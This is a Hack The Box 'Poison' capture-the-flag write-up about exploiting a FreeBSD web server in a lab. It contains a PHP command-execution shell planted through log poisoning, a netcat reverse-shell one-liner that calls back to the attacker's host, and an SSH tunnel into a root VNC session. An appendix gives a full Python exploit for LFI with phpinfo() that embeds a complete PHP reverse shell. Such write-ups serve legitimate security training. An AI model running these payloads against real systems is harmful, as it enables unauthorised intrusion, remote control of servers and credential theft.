# Hackthebox Poison


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
root@kali:~/htb/poison# cat poison_full.nmap
# Nmap 7.70 scan initiated Mon Dec  3 19:46:34 2018 as: nmap -v -sV -p- -T4 -oA poison_full 10.10.10.84                                                                                                     
Nmap scan report for 10.10.10.84
Host is up (0.038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

So a scan of all tcp ports shows two open ports, SSH and a webserver.

A quick nikto scan of the webapp shows that we have a phpinfo() function located at phpinfo.php/.

```
root@kali:~/htb/poison# nikto -h 10.10.10.84                               
- Nikto v2.1.6                                                              
---------------------------------------------------------------------------
+ Target IP:          10.10.10.84                                       
+ Target Hostname:    10.10.10.84                                     
+ Target Port:        80
+ Start Time:         2018-12-03 19:57:45 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+ Retrieved x-powered-by header: PHP/5.6.32
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Output from the phpinfo() function was found.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ 7498 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2018-12-03 20:03:09 (GMT1) (324 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

If we visit the webapplication we are presented with a textbox where we can provide a name of a file.

That string is inserted in a GET request parameter like this http://10.10.10.84/browse.php?file=test.txt. If we supply a file that do not exist we get the following error:

```
Warning: include(test.txt): failed to open stream: No such file or directory in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening 'test.txt' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2
```

This error indicates that we have a local file inclusion on the parameter. Let's try to access an arbitrary file

http://10.10.10.84/browse.php?file=/etc/passwd

```
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

## Initial Compromise

### LFI to RCE through log poisoning

There are a couple of ways to escelate an LFI to code execution. In our case we are able to access the webserver logs through our file inclusion.

Using this we could gain code execution by injecting PHP code into the Apache log and then request that file in our browser through the LFI. The php code in the log file would then be executed. And as the name of the box suggest, this is the intended route.

There is a shortcut we could take but I will follow the intended rout for now. 

Injecting a php shell in the access log of the webserver:

```
root@kali:~/htb/poison# nc -vn 10.10.10.84 80
(UNKNOWN) [10.10.10.84] 80 (http) open
<?php system($_GET['cmd']); ?>

HTTP/1.1 400 Bad Request
Date: Mon, 03 Dec 2018 21:39:07 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
root@kali:~/htb/poison# 
```

We can then access the log through the LFI and execute commands:

http://10.10.10.84/browse.php?file=../../../../../../../../var/log/httpd-access.log&cmd=id


```
192.168.253.133 - - [24/Jan/2018:18:33:25 +0100] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET / HTTP/1.0" 200 289 "-" "-"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET / HTTP/1.0" 200 289 "-" "-"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "POST /sdk HTTP/1.1" 404 201 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET /nmaplowercheck1521462526 HTTP/1.1" 404 222 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET / HTTP/1.1" 200 289 "-" "-"
10.10.14.4 - - [19/Mar/2018:13:28:50 +0100] "GET /HNAP1 HTTP/1.1" 404 203 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.10.14.12 - - [03/Dec/2018:22:37:25 +0100] "GET /browse.php?file=../../../../../../../../var/log/httpd-error.log HTTP/1.1" 200 5002 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.10.14.12 - - [03/Dec/2018:22:37:29 +0100] "GET /browse.php?file=../../../../../../../../var/log/httpd-access.log HTTP/1.1" 200 1088 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.10.14.12 - - [03/Dec/2018:22:38:23 +0100] "-" 408 - "-" "-"
10.10.14.12 - - [03/Dec/2018:22:39:07 +0100] "uid=80(www) gid=80(www) groups=80(www)
" 400 226 "-" "-"
10.10.14.12 - - [03/Dec/2018:22:39:13 +0100] "GET /browse.php?file=../../../../../../../../var/log/httpd-access.log HTTP/1.1" 200 1550 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.10.14.12 - - [03/Dec/2018:22:39:23 +0100] "GET /browse.php?file=../../../../../../../../var/log/httpd-access.log?cmd=id HTTP/1.1" 200 455 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
```

In one of the rows we can see the output of our id command.

So next I will be using the following netcat reverse shell payload which I use alot: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 80 >/tmp/f`

Request:

```
GET /browse.php?file=../../../../../../../../var/log/httpd-access.log&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.12+80+%3E/tmp/f HTTP/1.1
Host: 10.10.10.84
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Catch the reverse shell:

```
root@kali:~/htb/poison# nc -lvp 80
listening on [any] 80 ...
10.10.10.84: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.84] 61394
sh: can't access tty; job control turned off
$ id
uid=80(www) gid=80(www) groups=80(www)
$ 
```

### LFI to RCE through phpinfo()

There is another unintended way to gain code execution through a LFI. We can actually leverage the phpinfo page to accomplish this.

The attack is described on the follwing page: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf. 


There are some parts of the exploit that we need to modify such as the payload and URL.


```
root@kali:~/htb/poison# python phpinfolfi.py 10.10.10.84 80 100
Don't forget to modify the LFI URL
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 112941
Spawning worker pool (100)...
 116 /  1000
Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...
```

Catching the shell:
```
root@kali:~/htb# nc -lvp 443
listening on [any] 443 ...
10.10.10.84: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.84] 22941
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64                                              
10:18PM  up 1 day, 37 mins, 0 users, load averages: 0.43, 0.29, 0.27
USER       TTY      FROM                                      LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
$ id
uid=80(www) gid=80(www) groups=80(www)
$
```

I'll post the full exploit in an appendix at the end of this writeup.


## Privilege Escalation

The shell we landed in is pretty unstable and we are not able to do much.

We know from the passwd file that there is a user called charix. If we could get access as that user, we should have way more access. 

I start by going through the files of the webappliaction to hopefylly find some hardcoded credentials or alike.

In the webroot there is a file called pwdbackup.txt, that seems insteresting.

```
$ cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

We see by the trailing equal sign that the text is probably base64 encoded, and "atleast 13 times" according to the text. So let's base64 decode the text 13 times.

And bingo, after decoding the text we get the following string `Charix!2#4%6&8(0`. The new string suggests it has something to do with Charix, a password maybe?


```
$ su charix
Password:Charix!2#4%6&8(0

id  
uid=1001(charix) gid=1001(charix) groups=1001(charix)
```

The shell is still a little bit funky, but now we could just log in as the user through SSH.


A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

In this case, we can use number 1 on that list. 

In the homefolder of the user we find an interesting file called "secret.zip". Let's copy it to our local kali box

```
root@kali:~/htb/poison# scp -oKexAlgorithms=+diffie-hellman-group1-sha1 charix@10.10.10.84:/home/charix/
secret.zip .
```

We can the unzip the file with the same password as for the user charix. The contents just seem to be jibberish.

Back on the victim, running a netstat command to see the listening services on the box:

```
charix@Poison:~ % netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.14.12.33738      ESTABLISHED
tcp4       0      0 10.10.10.84.26980      10.10.14.12.80         CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.12.34250      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.* 
```

The ports 5801 and 5901 kind of sticks out, that is usually VNC ports. Let's check the running processes to see if we notice something interesting there:

```
root    529   0.0  0.7  23620 7428 v0- I    Mon21      0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /ro
```

The line above shows that there is a xvnc process running as root on the box. Let's try to connect to it by tunnel out that port using ssh local port forwarding.


Tunnel the remote port to our kali box:

```
root@kali:~/htb/poison# ssh -L5901:127.0.0.1:5901 -oKexAlgorithms=+diffie-hellman-group1-sha1 charix@10.10.10.84
```

Running vncviewer against the port, first by trying the password, which did not work. Second by specifying a password file, the file we got from the victims home folder.

```
root@kali:~/htb/poison# vncviewer 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password:
Authentication failed
root@kali:~/htb/poison# vncviewer 127.0.0.1:5901 -passwd secret
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

A window will open with a root prompt on the box.

## Appendix - LFI Exploit code

```
#!/usr/bin/python                                                                                                                                                                                  
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
import sys                                                                            
import threading                                           
import socket                     
                                  
def setup(host, port):                                     
    TAG="Security Test"                    
    PAYLOAD="""%s\r                       
<?php                           
                                                          
set_time_limit (0);                                          
$VERSION = "1.0";                                                      
$ip = '10.10.14.12';  // CHANGE THIS                                            
$port = 443;       // CHANGE THIS
$chunk_size = 1400;                                          
$write_a = null;                                           
$error_a = null;                          
$shell = 'uname -a; w; id; /bin/sh -i';                   
$daemon = 0;                                                               
$debug = 0;                                                                              
                                          
//                                     
// Daemonise ourself if possible to avoid zombies later
//                                                                                    
                                                                             
// pcntl_fork is hardly ever available, but will allow us to daemonise       
// our php process and avoid zombies.  Worth a try...        
if (function_exists('pcntl_fork')) {                   
        // Fork and have the parent process exit                           
        $pid = pcntl_fork();                    
                                                
        if ($pid == -1) {                   
                printit("ERROR: Can't fork");                
                exit(1);                  
        }                                  
                                                   
        if ($pid) {                                                                   
                exit(0);  // Parent exits                    
        }                                                   
                                                         
        // Make the current process a session leader      
        // Will only succeed if we forked                
        if (posix_setsid() == -1) {                       
                printit("Error: Can't setsid()");
                exit(1);              
        }                                          

        $daemon = 1;                                                                                                                                                                                
} else {                                                   
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}                                                          
                                  
// Change to a safe directory     
chdir("/");                                                
                                           
// Remove any umask we inherited          
umask(0);                       
                                                          
//                                                           
// Do the reverse shell...                                             
//                                                                              
                 
// Open reverse connection                                   
$sock = fsockopen($ip, $port, $errno, $errstr, 30);        
if (!$sock) {                             
        printit("$errstr ($errno)");                      
        exit(1);                                                           
}                                                                                        
                                          
// Spawn shell process                 
$descriptorspec = array(      
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from         
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);                                                           
                                                       
$process = proc_open($shell, $descriptorspec, $pipes);                     
                                                
if (!is_resource($process)) {                   
        printit("ERROR: Can't spawn shell");
        exit(1);                                             
}                                         
                                           
// Set everything to non-blocking                  
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);                           
stream_set_blocking($pipes[1], 0);                          
stream_set_blocking($pipes[2], 0);                       
stream_set_blocking($sock, 0);                            
                                                         
printit("Successfully opened reverse shell to $ip:$port");
                            
while (1) {                           
        // Check for end of TCP connection         
        if (feof($sock)) { 
                printit("ERROR: Shell connection terminated");                                                                                                                                     
                break;                                     
        }                                                          
                                                           
        // Check for end of STDOUT
        if (feof($pipes[1])) {    
                printit("ERROR: Shell process terminated");
                break;                     
        }                                 
                                
        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR   
        $read_a = array($sock, $pipes[1], $pipes[2]);                  
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
                 
        // If we can read from the TCP socket, send          
        // data to process's STDIN                         
        if (in_array($sock, $read_a)) {   
                if ($debug) printit("SOCK READ");         
                $input = fread($sock, $chunk_size);                        
                if ($debug) printit("SOCK: $input");                                     
                fwrite($pipes[0], $input);
        }                              
                              
        // If we can read from the process's STDOUT                                   
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");          
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");                     
                fwrite($sock, $input);          
        }                                       
                              
        // If we can read from the process's STDERR          
        // send data down tcp connection  
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");       
                fwrite($sock, $input);                      
        }                                                
}                                                         
                                                         
fclose($sock);             
fclose($pipes[0]);          
fclose($pipes[1]);                    
fclose($pipes[2]);                                 
proc_close($process);
                                                                                                                                                                                                   
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {                               
        if (!$daemon) {  
                print "$string\n";
        }                             
}                                          
                                          
?>                              
    \r""" % TAG                    
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r       
\r               
%s                                                           
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000                    
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r                                                       
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r        
Host: %s\r                
\r                                                           
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script                                    
    LFIREQ="""GET /browse.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r                       
Proxy-Connection: Keep-Alive\r
Host: %s\r                                                   
\r                                        
\r                                     
"""                      
    return (REQ1, TAG, LFIREQ)
                                                             
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                         
    s.connect((host, port))
    s2.connect((host, port))
                                      
    s.send(phpinforeq)                             
    d = "" 
    while len(d) < offset:                                                                                                                                                                          
        d += s.recv(offset)
    try:                 
        i = d.index("[tmp_name] =&gt")                     
        fn = d[i+17:i+31]
    except ValueError:  
        return None                   
                                           
    s2.send(lfireq % (fn, host))          
    d = s2.recv(4096)           
    s.close()                      
    s2.close()        
                         
    if d.find(tag) != -1:        
        return fn
                                                             
counter=0             
class ThreadWorker(threading.Thread):     
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e                                                                   
        self.lock =  l
        self.maxattempts = m
        self.args = args      
                   
    def run(self):          
        global counter    
        while not self.event.is_set():                       
            with self.lock:
                if counter >= self.maxattempts:                            
                    return        
                counter+=1                      
                           
            try:                                             
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x: 
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()            
               
            except socket.error:
                return                                   
                   
                
def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host,port))                                                                                                                                                                           
    s.send(phpinforeq)
                         
    d = ""                                                 
    while True:    
        i = s.recv(4096)
        d+=i                          
        if i == "":                        
            break                         
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break     
    s.close()            
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
                      
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256             
                                                                                         
def main():
                
    print "LFI With PHPInfo()"
    print "-=" * 30
                            
    if len(sys.argv) < 2: 
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)
                                                                           
    try:                          
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)   
                              
    port=80  
    try:              
        port = int(sys.argv[2])
    except IndexError:                          
        pass   
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
                
    poolsz=10
    try:                
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    print "Don't forget to modify the LFI URL"
    main()
```
